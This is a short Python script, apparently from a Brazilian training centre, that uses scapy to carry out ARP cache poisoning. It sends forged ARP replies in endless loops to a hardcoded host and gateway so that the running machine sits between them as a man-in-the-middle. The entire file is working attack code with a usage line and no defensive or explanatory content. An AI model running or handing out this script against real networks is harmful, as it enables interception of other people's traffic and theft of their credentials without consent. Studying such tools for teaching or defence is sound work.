#!/usr/bin/python
#-*-coding:utf-8-*-

#####################################################
#                                                   #
#   UNICIV - Centro de Inovação VincIT              #
#   https://www.uniciv.com.br                       #
#                                                   #
#   Desenvolvedor: h1s0k4                           #
#   E-mail: willian_brito00@hotmail.com             #
#                                                   #
#   USAGE: python mitm.py                           #
#                                                   #
#####################################################

from scapy.all import *
import threading

target = "192.168.0.21"
gateway = "192.168.0.1"

poisonTarget = Ether() / ARP(pdst=target, psrc=gateway, op="is-at")
poisonGateway = Ether() / ARP(pdst=gateway, psrc=target, op="is-at")

def mITM():
	sendp(poisonTarget, inter=1, loop=True)

threading.Thread(target=mITM).start()
sendp(poisonGateway, inter=1, loop=True)